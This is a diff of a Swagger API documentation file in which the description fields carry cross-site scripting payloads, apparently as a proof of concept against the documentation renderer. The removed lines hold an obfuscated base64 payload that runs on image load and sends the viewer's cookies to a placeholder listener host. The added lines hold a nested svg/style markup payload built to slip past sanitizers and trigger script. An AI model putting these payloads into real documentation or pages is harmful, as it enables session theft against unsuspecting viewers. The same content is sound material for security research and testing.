@@ -2,7 +2,16 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <svg><p><!----><img src="https://act.wintershalldea.no/favicon.ico" onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))" ></svg>
+    <table>
+      <caption>
+        <svg>
+          <title>
+            <caption></caption>
+          </title>
+          <style><a id="</style><img src=x onerror=alert()>"></a></style>
+        </svg>
+      </caption>
+    </table>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +37,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <svg><p><!----><img src="https://act.wintershalldea.no/favicon.ico" onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))" ></svg>
+          
 
           format: int64
           in: path
